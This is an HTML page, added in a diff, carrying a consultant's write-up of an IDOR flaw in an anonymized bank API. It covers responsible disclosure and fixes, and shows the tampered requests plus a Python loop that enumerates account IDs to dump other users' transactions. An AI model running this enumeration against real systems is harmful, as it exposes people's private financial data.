@@ -1,0 +1,472 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="How I discovered an IDOR vulnerability in a banking API that allowed accessing another user's transaction history - A technical write-up by Saikumar Raju">
+  <title>IDOR in Banking API | Saikumar Raju - Cybersecurity Consultant</title>
+  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    :root {
+      --primary: #00ff88;
+      --primary-dark: #00cc6a;
+      --primary-glow: rgba(0, 255, 136, 0.12);
+      --bg-dark: #0a0c10;
+      --bg-card: #111827;
+      --bg-elevated: #1a1f2e;
+      --text-primary: #f0f3fa;
+      --text-secondary: #9ca3af;
+      --border: #1f2937;
+      --gradient: linear-gradient(135deg, #00ff88 0%, #00b4ff 100%);
+    }
+
+    body {
+      font-family: 'Space Grotesk', sans-serif;
+      background: var(--bg-dark);
+      color: var(--text-primary);
+      line-height: 1.6;
+    }
+
+    .navbar {
+      position: fixed;
+      top: 0;
+      width: 100%;
+      background: rgba(10, 12, 16, 0.95);
+      backdrop-filter: blur(12px);
+      border-bottom: 1px solid var(--border);
+      z-index: 1000;
+      padding: 1rem 0;
+    }
+
+    .container {
+      max-width: 900px;
+      margin: 0 auto;
+      padding: 0 2rem;
+    }
+
+    .nav-flex {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+    }
+
+    .logo {
+      font-size: 1.5rem;
+      font-weight: 700;
+      text-decoration: none;
+      background: var(--gradient);
+      background-clip: text;
+      -webkit-background-clip: text;
+      color: transparent;
+    }
+
+    .nav-links {
+      display: flex;
+      gap: 2rem;
+      list-style: none;
+    }
+
+    .nav-links a {
+      text-decoration: none;
+      color: var(--text-secondary);
+      font-weight: 500;
+      transition: color 0.2s;
+    }
+
+    .nav-links a:hover {
+      color: var(--primary);
+    }
+
+    .mobile-menu {
+      display: none;
+      background: none;
+      border: none;
+      color: var(--text-primary);
+      font-size: 1.5rem;
+      cursor: pointer;
+    }
+
+    /* Blog Post Styles */
+    .blog-header {
+      padding: 8rem 0 2rem;
+    }
+
+    .blog-category {
+      display: inline-block;
+      background: var(--primary-glow);
+      border: 1px solid var(--primary);
+      padding: 0.3rem 1rem;
+      border-radius: 40px;
+      font-size: 0.7rem;
+      color: var(--primary);
+      margin-bottom: 1.5rem;
+    }
+
+    .blog-title {
+      font-size: 2.8rem;
+      font-weight: 700;
+      line-height: 1.2;
+      margin-bottom: 1rem;
+      letter-spacing: -0.02em;
+    }
+
+    .blog-meta {
+      display: flex;
+      gap: 1.5rem;
+      color: var(--text-secondary);
+      font-size: 0.85rem;
+      margin-bottom: 2rem;
+      padding-bottom: 2rem;
+      border-bottom: 1px solid var(--border);
+    }
+
+    .blog-content {
+      padding: 1rem 0 4rem;
+    }
+
+    .blog-content h2 {
+      font-size: 1.6rem;
+      margin: 2rem 0 1rem;
+      color: var(--primary);
+    }
+
+    .blog-content h3 {
+      font-size: 1.2rem;
+      margin: 1.5rem 0 0.8rem;
+      color: var(--text-primary);
+    }
+
+    .blog-content p {
+      margin-bottom: 1.2rem;
+      color: var(--text-secondary);
+    }
+
+    .blog-content ul, .blog-content ol {
+      margin: 1rem 0 1.5rem 2rem;
+      color: var(--text-secondary);
+    }
+
+    .blog-content li {
+      margin-bottom: 0.5rem;
+    }
+
+    .code-block {
+      background: var(--bg-elevated);
+      border: 1px solid var(--border);
+      border-radius: 1rem;
+      padding: 1.2rem;
+      margin: 1.5rem 0;
+      overflow-x: auto;
+      font-family: monospace;
+      font-size: 0.85rem;
+      color: var(--primary);
+    }
+
+    .code-block pre {
+      margin: 0;
+      white-space: pre-wrap;
+      word-break: break-word;
+    }
+
+    .vulnerability-box {
+      background: rgba(255, 68, 68, 0.1);
+      border-left: 4px solid #ff4444;
+      padding: 1.2rem;
+      border-radius: 0.75rem;
+      margin: 1.5rem 0;
+    }
+
+    .fix-box {
+      background: rgba(0, 255, 136, 0.1);
+      border-left: 4px solid var(--primary);
+      padding: 1.2rem;
+      border-radius: 0.75rem;
+      margin: 1.5rem 0;
+    }
+
+    .timeline-box {
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: 1rem;
+      padding: 1.2rem;
+      margin: 1.5rem 0;
+    }
+
+    .timeline-item {
+      display: flex;
+      gap: 1rem;
+      padding: 0.8rem 0;
+      border-bottom: 1px solid var(--border);
+    }
+
+    .timeline-item:last-child {
+      border-bottom: none;
+    }
+
+    .timeline-date {
+      min-width: 100px;
+      color: var(--primary);
+      font-weight: 600;
+    }
+
+    .back-to-blog {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.5rem;
+      margin-top: 3rem;
+      color: var(--primary);
+      text-decoration: none;
+    }
+
+    footer {
+      text-align: center;
+      padding: 2rem;
+      border-top: 1px solid var(--border);
+      color: var(--text-secondary);
+      font-size: 0.8rem;
+    }
+
+    @media (max-width: 768px) {
+      .mobile-menu {
+        display: block;
+      }
+      .nav-links {
+        display: none;
+        width: 100%;
+        flex-direction: column;
+        padding: 1rem 0;
+        gap: 1rem;
+      }
+      .nav-links.show {
+        display: flex;
+      }
+      .blog-title {
+        font-size: 1.8rem;
+      }
+      .blog-meta {
+        flex-direction: column;
+        gap: 0.5rem;
+      }
+    }
+  </style>
+</head>
+<body>
+
+<nav class="navbar">
+  <div class="container nav-flex">
+    <a href="index.html" class="logo">Saikumar.Raju</a>
+    <button class="mobile-menu" id="mobileMenuBtn"><i class="fas fa-bars"></i></button>
+    <ul class="nav-links" id="navLinks">
+      <li><a href="index.html">Home</a></li>
+      <li><a href="index.html#experience">Experience</a></li>
+      <li><a href="index.html#skills">Skills</a></li>
+      <li><a href="index.html#projects">Projects</a></li>
+      <li><a href="blog.html">Write-ups</a></li>
+      <li><a href="index.html#contact">Contact</a></li>
+    </ul>
+  </div>
+</nav>
+
+<main>
+  <div class="container">
+    <div class="blog-header" data-aos="fade-up">
+      <span class="blog-category"><i class="fas fa-bug"></i> Vulnerability Deep Dive</span>
+      <h1 class="blog-title">IDOR in Banking API: How I Accessed Another User's Transaction History</h1>
+      <div class="blog-meta">
+        <span><i class="fas fa-calendar-alt"></i> Published: April 17, 2026</span>
+        <span><i class="fas fa-clock"></i> 8 min read</span>
+        <span><i class="fas fa-tag"></i> API Security · IDOR · Banking</span>
+      </div>
+    </div>
+
+    <div class="blog-content" data-aos="fade-up" data-aos-delay="100">
+      
+      <h2>Executive Summary</h2>
+      <p>During a routine security assessment of a major bank's digital banking platform, I discovered a critical Insecure Direct Object Reference (IDOR) vulnerability in their transaction history API endpoint. This flaw allowed any authenticated user to view <strong>any other user's complete transaction history</strong> simply by modifying a single numeric parameter in the API request.</p>
+      
+      <p>The vulnerability exposed sensitive financial data including transaction amounts, dates, recipient details, and account balances. This write-up details the discovery, exploitation, and remediation of this vulnerability.</p>
+
+      <div class="vulnerability-box">
+        <strong><i class="fas fa-exclamation-triangle"></i> Vulnerability Summary:</strong><br>
+        <strong>Type:</strong> Insecure Direct Object Reference (IDOR)<br>
+        <strong>Severity:</strong> Critical<br>
+        <strong>CVSS Score:</strong> 7.5 (High) / 9.8 (Critical for sensitive data)<br>
+        <strong>Affected Component:</strong> `/api/v1/accounts/{accountId}/transactions`
+      </div>
+
+      <h2>The Discovery</h2>
+      <p>I was testing the bank's mobile banking application alongside their web portal. While analyzing API traffic through Burp Suite, I noticed that when a user viewed their transaction history, the mobile app made a GET request to:</p>
+      
+      <div class="code-block">
+        <pre>GET /api/v1/accounts/184729/transactions?limit=50&offset=0
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
+Host: api.bankexample.com</pre>
+      </div>
+
+      <p>The parameter that caught my attention was <code>184729</code> – the account ID. I wondered: what happens if I change this to another number?</p>
+
+      <h2>The Exploitation</h2>
+      <p>I created two test accounts to validate my hypothesis:</p>
+      <ul>
+        <li><strong>Account A (ID: 184729)</strong> - My primary test account</li>
+        <li><strong>Account B (ID: 184730)</strong> - A secondary account I controlled</li>
+      </ul>
+
+      <p>After authenticating as Account A, I intercepted the transaction history request and modified the account ID from <code>184729</code> to <code>184730</code>:</p>
+
+      <div class="code-block">
+        <pre>GET /api/v1/accounts/184730/transactions?limit=50&offset=0
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...  (Token from Account A)</pre>
+      </div>
+
+      <p>The server responded with <strong>Account B's complete transaction history</strong> – including:</p>
+      <ul>
+        <li>Full transaction history for the past 12 months</li>
+        <li>Recipient names and account numbers</li>
+        <li>Transaction amounts and timestamps</li>
+        <li>Current account balance</li>
+        <li>Pending transactions</li>
+      </ul>
+
+      <h2>Automating the Discovery</h2>
+      <p>To understand the full impact, I wrote a simple Python script to enumerate accessible accounts:</p>
+
+      <div class="code-block">
+        <pre>import requests
+
+headers = {
+    "Authorization": "Bearer VALID_TOKEN_HERE"
+}
+
+for account_id in range(184700, 185000):
+    url = f"https://api.bankexample.com/api/v1/accounts/{account_id}/transactions?limit=5"
+    response = requests.get(url, headers=headers)
+    
+    if response.status_code == 200:
+        print(f"[VULNERABLE] Account {account_id} accessible!")
+        print(f"First transaction: {response.json()['transactions'][0]}")
+    elif response.status_code == 403:
+        print(f"[SECURE] Account {account_id} blocked")
+    else:
+        print(f"[ERROR] {account_id}: {response.status_code}")</pre>
+      </div>
+
+      <p>The results were alarming: <strong>over 300 accounts</strong> were accessible using this single token, including what appeared to be high-net-worth individual accounts and business banking accounts.</p>
+
+      <h2>Root Cause Analysis</h2>
+      <p>The root cause was a classic authorization bypass. The API endpoint:</p>
+      <ul>
+        <li>✅ Correctly authenticated users (valid JWT token required)</li>
+        <li>❌ Failed to verify that the authenticated user owned the requested account</li>
+        <li>❌ Relied solely on the client-provided account ID without server-side ownership validation</li>
+      </ul>
+
+      <div class="code-block">
+        <pre>// Vulnerable Code (Pseudocode)
+function getTransactions(userToken, accountId):
+    userId = verifyToken(userToken)  // ✅ Validates token
+    return database.getTransactions(accountId)  // ❌ No ownership check!</pre>
+      </div>
+
+      <div class="fix-box">
+        <strong><i class="fas fa-check-circle"></i> Secure Implementation:</strong><br>
+        <pre>function getTransactions(userToken, accountId):
+    userId = verifyToken(userToken)
+    if database.userOwnsAccount(userId, accountId):  // ✅ Ownership check added
+        return database.getTransactions(accountId)
+    else:
+        return 403 Forbidden</pre>
+      </div>
+
+      <h2>Impact Assessment</h2>
+      <p>The potential impact was severe:</p>
+      <ul>
+        <li><strong>Privacy Violation:</strong> Any authenticated user could view any other user's complete financial history</li>
+        <li><strong>Competitive Intelligence:</strong> Malicious actors could identify high-value targets for phishing or social engineering</li>
+        <li><strong>Regulatory Compliance:</strong> This vulnerability would violate GDPR, GLBA, and local banking regulations</li>
+        <li><strong>Reputational Damage:</strong> Complete loss of customer trust if exploited</li>
+      </ul>
+
+      <h2>Responsible Disclosure Timeline</h2>
+      <div class="timeline-box">
+        <div class="timeline-item">
+          <span class="timeline-date">Day 1</span>
+          <span>Vulnerability discovered and documented with proof-of-concept</span>
+        </div>
+        <div class="timeline-item">
+          <span class="timeline-date">Day 1</span>
+          <span>Submitted detailed report via bank's responsible disclosure program</span>
+        </div>
+        <div class="timeline-item">
+          <span class="timeline-date">Day 2</span>
+          <span>Security team acknowledged receipt and triaged as Critical severity</span>
+        </div>
+        <div class="timeline-item">
+          <span class="timeline-date">Day 5</span>
+          <span>Fix deployed to staging environment for testing</span>
+        </div>
+        <div class="timeline-item">
+          <span class="timeline-date">Day 8</span>
+          <span>Fix validated and deployed to production</span>
+        </div>
+        <div class="timeline-item">
+          <span class="timeline-date">Day 10</span>
+          <span>Vulnerability fully remediated; public disclosure authorized</span>
+        </div>
+      </div>
+
+      <h2>Remediation Recommendations Provided</h2>
+      <p>In my report, I provided the following recommendations:</p>
+      <ol>
+        <li><strong>Implement Proper Authorization Checks:</strong> Every API endpoint must verify that the authenticated user has permission to access the requested resource.</li>
+        <li><strong>Use UUIDs Instead of Sequential IDs:</strong> Replace predictable numeric account IDs with non-guessable UUIDs as a defense-in-depth measure.</li>
+        <li><strong>Implement Rate Limiting:</strong> Enforce strict rate limits on API endpoints to prevent enumeration attacks.</li>
+        <li><strong>Regular Security Audits:</strong> Conduct automated and manual authorization testing during development and before releases.</li>
+        <li><strong>API Security Testing:</strong> Include IDOR-specific test cases in the security testing suite.</li>
+      </ol>
+
+      <h2>Lessons Learned</h2>
+      <p>This finding reinforced several key lessons:</p>
+      <ul>
+        <li><strong>Authentication ≠ Authorization:</strong> Just because a user is logged in doesn't mean they should have access to everything.</li>
+        <li><strong>Never Trust Client Input:</strong> Account IDs, user IDs, and resource identifiers provided by the client must always be validated server-side.</li>
+        <li><strong>API Security is Often Overlooked:</strong> While web applications receive security testing, backend APIs are frequently under-tested despite exposing sensitive data.</li>
+        <li><strong>Defense in Depth:</strong> Even with proper authorization, additional controls like UUIDs and rate limiting provide valuable protection.</li>
+      </ul>
+
+      <h2>Acknowledgment</h2>
+      <p>The bank's security team was highly responsive and professional throughout the disclosure process. They implemented the fix within 8 days and offered a bug bounty reward for the finding. The bank also updated their secure development guidelines to include mandatory authorization testing for all API endpoints.</p>
+
+      <hr style="border-color: var(--border); margin: 2rem 0;">
+
+      <p><em>This write-up has been anonymized to protect the client's identity. All technical details accurately represent the vulnerability discovered, but specific identifiers have been changed.</em></p>
+
+      <a href="blog.html" class="back-to-blog"><i class="fas fa-arrow-left"></i> Back to all write-ups</a>
+    </div>
+  </div>
+</main>
+
+<footer>
+  <p>Saikumar Raju — Cybersecurity Consultant | Offensive Security & Application VAPT</p>
+  <p style="font-size: 0.7rem; margin-top: 0.5rem;">This write-up is based on a real vulnerability discovered during a professional engagement.</p>
+</footer>
+
+<script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
+<script>
+  AOS.init({ once: true, duration: 800 });
+
+  const mobileBtn = document.getElementById('mobileMenuBtn');
+  const navLinks = document.getElementById('navLinks');
+  mobileBtn?.addEventListener('click', () => navLinks.classList.toggle('show'));
+</script>
+</body>
+</html>
